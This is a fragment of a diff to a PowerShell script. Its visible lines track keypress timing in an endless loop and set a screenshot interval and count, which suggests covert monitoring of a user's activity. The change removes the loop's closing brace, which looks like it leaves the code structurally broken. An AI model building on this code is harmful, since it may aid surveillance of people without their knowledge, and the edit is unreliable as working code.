@@ -95,8 +95,6 @@ While ($true){
     # Reset the stopwatch before restarting the loop
     $LastKeypressTime.Restart()
     Start-Sleep -Milliseconds 10
-}
-
 $seconds = 30 # Screenshot interval
 $a = 1 # Screenshot amount
 
